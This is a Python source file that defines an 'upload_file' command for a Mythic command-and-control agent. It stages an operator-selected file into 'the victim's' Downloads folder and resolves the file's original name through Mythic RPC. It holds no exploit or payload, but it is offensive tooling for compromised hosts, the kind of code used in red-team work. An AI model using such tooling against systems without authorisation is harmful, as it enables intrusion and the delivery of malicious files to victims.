from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)
from mythic_container.MythicRPC import (
    MythicRPCFileSearchMessage,
    SendMythicRPCFileSearch,
)
from mythic_container.logging import logger


class UploadFileArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="Local file to upload to the victim (selected in Mythic)",
                default_value="",
            ),
            CommandParameter(
                name="remote_path",
                type=ParameterType.String,
                description="Filename to save on the victim (defaults to the original filename)",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class UploadFileCommand(CommandBase):
    cmd = "upload_file"
    needs_admin = False
    help_cmd = "upload_file [file] [remote_path]"
    description = "Upload a local file to the victim's Downloads folder."
    version = 1
    author = "@Fir3n0x"
    attackmapping = []
    argument_class = UploadFileArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        # The File parameter only carries the file's UUID. Resolve it to the
        # original filename so the agent saves the file with the right name and
        # extension (instead of a bare "uploaded_<uuid>" fallback).
        file_id = taskData.args.get_arg("file")
        remote_path = taskData.args.get_arg("remote_path")
        if file_id and not remote_path:
            try:
                resp = await SendMythicRPCFileSearch(
                    MythicRPCFileSearchMessage(
                        AgentFileID=file_id,
                        TaskID=taskData.Task.ID,
                    )
                )
                if resp.Files and resp.Files[0].Filename:
                    taskData.args.set_arg("remote_path", resp.Files[0].Filename)
            except Exception as e:
                logger.error(f"Failed to resolve uploaded file name: {e}")

        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
